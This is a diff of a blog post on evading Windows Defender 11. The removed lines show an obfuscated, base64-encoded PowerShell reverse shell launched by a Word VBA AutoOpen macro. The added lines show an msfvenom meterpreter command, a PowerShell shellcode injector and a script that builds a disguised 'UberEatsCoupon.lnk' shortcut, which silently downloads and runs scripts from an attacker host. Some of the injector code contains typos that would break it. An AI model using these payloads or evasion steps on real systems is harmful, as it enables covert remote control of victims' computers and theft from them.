@@ -2,7 +2,7 @@
 
 - [**Outline**](#section-0)
 - [**Windows Defender  Explanation**](#section-1)
-- [**Word Document VBA Macro**](#section-2)
+- [**LNK**](#section-2)
 - [ **Proof of Concept - Bypassing 2023 Windows Defender 11**](#section-3)
 
 
@@ -10,67 +10,74 @@
 
 ## Outline  {#section-0}
 
-The objective of this document is to explore evasion techniques concerning the latest security measures implemented within Windows Defender 11. Specifically, the aim is to execute a reverse shell from a Microsoft Word document. The ultimate goal is to achieve Remote Code Execution (RCE) within the context of NT/Authority System privileges upon opening the malicious Word document.
+The objective of this document is to demonstrate the utilization of a malicious LNK file to initiate a multi-stage attack, including downloading and executing obfuscated AMSI bypass script, a shell code injector to bypass the most up-to-date Windows 11 Defender. 
 
 ![](/assets/AV/LNKSummary.png)  
 
 # Windows Defender   {#section-1}
 Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.
 
-# Word Document VBA Macro {#section-2}
+# LNK Exploitation {#section-2}
 
-A Word document VBA macro is a script embedded within a Word document that uses Visual Basic for Applications (VBA) to automate tasks or perform certain functions within the document. Macros can execute commands, manipulate data, or interact with external systems.
+An LNK file, short for Shell Link Binary File, is a file type associated with Windows shortcuts. LNK files typically serve as pointers to executable files or applications, allowing users to quickly access programs or documents. However, in a malicious context, an LNK file can be crafted to download and execute a Defender bypass script along with a shell code injector. This technique is employed in cyberattacks to evade detection by security tools and gain unauthorized access or control over a target system. Similar to Word document macros, the malicious LNK file exploits the execution capabilities of its associated application to carry out unauthorized actions on the compromised system.
 
-In the context of Word document macros, a malicious macro might attempt to establish this reverse shell connection, allowing an attacker to control the compromised system remotely. This is often used as part of cyberattacks to gain unauthorized access or control over a victim's computer.
+# LNK Exploitation Proof of Concept {#section-3}
+<img src="/assets/AV/LNK.gif" width="1500" height="2500"/>
 
-# Evasion Proof of Concept {#section-3}
-<img src="/assets/AV/FinalMacro.gif" width="1500" height="2500"/>
 Below are the steps:
+Generate a meterpreter shell code using the below command
 ```bash
-$client = New-Object System.Net.Sockets.TCPClient('legitwebsite.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.20.131 LPORT=443 EXITFUNC=process -f ps1
+```
+Generate a powershell shell code process injector 
+
+```bash
+
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernl32")]
+    public static extern IntPtr VirtulAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SeLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $Kernel32
+
+[Byte[]] $buf = <Shell Code>
+
+$size = $buf.Length
+
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 
 ```
-Now manually applying Obfuscation techniques we get 
+Conduct obfuscation on both AMSI SCript and and Shell Code Injector. This process has been neglected for possible abuse cases.
+
+Now we continue to craft our LNK file
 
 ```bash
+$doordash = 'iex (iwr -UseBasicParsing http://192.168.20.131:8888/google.txt);(iwr -usebasicparsing http://192.168.20.131:8888/facebookTest.ps1)|IEX'
 
-$client = <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit > New-Object Syste''m.Net.Sockets.TCPClient('legitwebsite.com',80); <# Suspendisse korean github   websiteellentesque suscipit #> $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; <# Healthy subject to eat with #>while(($i = $stream.Read($bytes, 0, $bytes.  Length)) -ne 0){;$data = (New-Object -TypeName <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> System.Text.ASCIIEncoding).GetString($bytes,0, $i);  $sendback = (ie""x'' $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (gl).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write  ($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() <# aslkd;l l;ka;skd;lkasd dalskd;laksdl;kasdksasdcipit #>  
-
-```
-Encoding the powershell with base64.
-
-```bash
-
-powershell.exe -exec bypass -enc IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzACAAJABjAGwAaQBlAG4AdAAgAD0AIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGUAdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlACcAJwBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADgALgB0AGMAcAAuAHUAcwAtAGMAYQBsAC0AMQAuAG4AZwByAG8AawAuAGkAbwAnACwAMQAzADYANAAwACkAOwAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGsAbwByAGUAYQBuACAAZwBpAHQAaAB1AGIAIAB3AGUAYgBzAGkAdABlAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAPAAjACAASABlAGEAbAB0AGgAeQAgAHMAdQBiAGoAZQBjAHQAIAB0AG8AIABlAGEAdAAgAHcAaQB0AGgAIAAjAD4AdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAaQBtAHAAZQByAGQAaQBlAHQAIABsAGEAYwB1AHMAIABlAHUAIAB0AGUAbABsAHUAcwAgAHAAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAIgAiAHgAJwAnACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAZwBsACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAA8ACMAIABhAHMAbABrAGQAOwBsACAAbAA7AGsAYQA7AHMAawBkADsAbABrAGEAcwBkACAAZABhAGwAcwBrAGQAOwBsAGEAawBzAGQAbAA7AGsAYQBzAGQAawBzAGEAcwBkAGMAaQBwAGkAdAAgACMAPgAKAA==
-
-```
-Crafting the Payload in Word Document VBA
-
-```bash
-Sub AutoOpen()
-    MyMacro
-End Sub
-Sub Document_Open()
-    MyMacro
-End Sub
-
-Sub MyMacro()
-Dim facebook
-facebook = "powershell.exe -nop -w hidden -e IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGkAbQBwAGUAcgBkAGkAZQB0ACAAbABhAGMAdQBzACAAZQB1ACAAdABlAGwAbAB1AHM" _
-& "AIABwAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAJwAnAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGw" _
-& "AaQBlAG4AdAAoACcANAAuAHQAYwBwAC4AdQBzAC0AYwBhAGwALQAxAC4AbgBnAHIAbwBrAC4AaQBvACcALAAxADIAOAA4ADAAKQA7ACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAawBvAHIAZQBhAG4AIABnAGk" _
-& "AdABoAHUAYgAgAHcAZQBiAHMAaQB0AGUAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACg" _
-& "AKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAA8ACMAIABIAGUAYQBsAHQAaAB5ACAAcwB1AGIAagBlAGMAdAAgAHQAbwAgAGUAYQB0ACAAdwBpAHQ" _
-& "AaAAgACMAPgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHs" _
-& "AOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGU" _
-& "AdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGU" _
-& "AdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQAiACIAeAAnACcAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHI" _
-& "AaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABnAGwAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHk" _
-& "AdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQ" _
-& "AZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACg" _
-& "AKQAgADwAIwAgAGEAcwBsAGsAZAA7AGwAIABsADsAawBhADsAcwBrAGQAOwBsAGsAYQBzAGQAIABkAGEAbABzAGsAZAA7AGwAYQBrAHMAZABsADsAawBhAHMAZABrAHMAYQBzAGQAYwBpAHAAaQB0ACAAIwA+AA=="
-Call Shell(facebook, vbHide)
-End Sub
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($doordash)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+$obj = New-object -comobject wscript.shell
+$link = $obj.createshortcut("D:\Users\kkyun\Desktop\UberEatsCoupon.lnk")
+$link.windowstyle = "7"
+$link.targetpath = "C:\windows\system32\cmd.exe"
+$link.iconlocation = "C:\windows\system32\notepad.exe"
+$link.arguments = "/c powershell -Nop -ep bypass -w hidden -EncodedCommand  $($encodedCommand)"
+$link.save()
 ```
 
 
